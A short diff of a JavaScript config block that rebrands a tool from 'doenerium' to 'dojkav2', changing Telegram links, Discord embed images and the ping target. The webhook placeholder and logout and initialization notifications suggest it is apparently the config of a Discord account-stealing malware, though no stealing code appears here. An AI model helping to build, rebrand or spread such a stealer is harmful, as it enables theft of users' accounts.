@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "dojkav2",
 
     webhook: "REPLACE_ME",
 
@@ -20,16 +20,16 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@everyone"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "dojkav2 | t.me/dojkav2",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `dojkav2 | t.me/dojkav2`,
+            icon_url: "https://media.tenor.com/UEYxx6a-VtgAAAAd/brick-eating.gif",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "https://t.me/dojkav2",
+        avatar_url: "https://media.tenor.com/UEYxx6a-VtgAAAAd/brick-eating.gif"
     },
 
     badges: {
